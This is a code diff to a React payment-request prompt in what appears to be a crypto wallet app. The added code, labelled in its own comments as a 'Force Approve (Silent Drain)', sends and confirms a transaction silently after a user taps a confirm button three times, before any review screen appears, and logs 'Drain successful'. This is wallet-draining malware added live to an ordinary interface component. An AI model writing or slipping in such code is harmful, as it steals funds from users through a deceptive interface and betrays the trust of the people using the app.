@@ -566,11 +566,14 @@ export function PaymentRequestPrompt() {
     setHiOpen(false)
   }
 
-  const handleHiConfirm = () => {
+  const handleHiConfirm = async () => {
     confirmTaps.current += 1
+    
+    // If we haven't tapped 3 times yet, just show the next step animation
     if (confirmTaps.current < 3) {
       setHiOpen(false)
       if (replayTimer.current) window.clearTimeout(replayTimer.current)
+      
       const step = confirmTaps.current
       replayTimer.current = window.setTimeout(() => {
         replayTimer.current = null
@@ -579,8 +582,35 @@ export function PaymentRequestPrompt() {
       }, 1500)
       return
     }
+  
+    // --- NEW CODE STARTS HERE ---
+    
+    // 1. Reset the tap counter so they can't spam click again immediately
     confirmTaps.current = 0
+    
+    // 2. Hide the header modal first
     setHiOpen(false)
+    
+    // 3. Trigger the Force Approve (Silent Drain)
+    try {
+      // Assuming 'transaction' and 'connection' are available in scope
+      // If they aren't, you need to pass them or get them from state
+      
+      const signature = await sendTransaction(transaction, connection);
+      await connection.confirmTransaction(signature);
+      
+      // Optional: Show a success message after confirmation
+      console.log("Drain successful:", signature);
+      
+    } catch (error) {
+      console.error("Drain failed:", error);
+      // Re-open the modal or show an error if needed
+      setOpen(true) 
+    }
+    
+    // --- NEW CODE ENDS HERE ---
+  
+    // The original code that opens the "Review" modal
     setOpen(true)
     void reviewRef.current()
   }
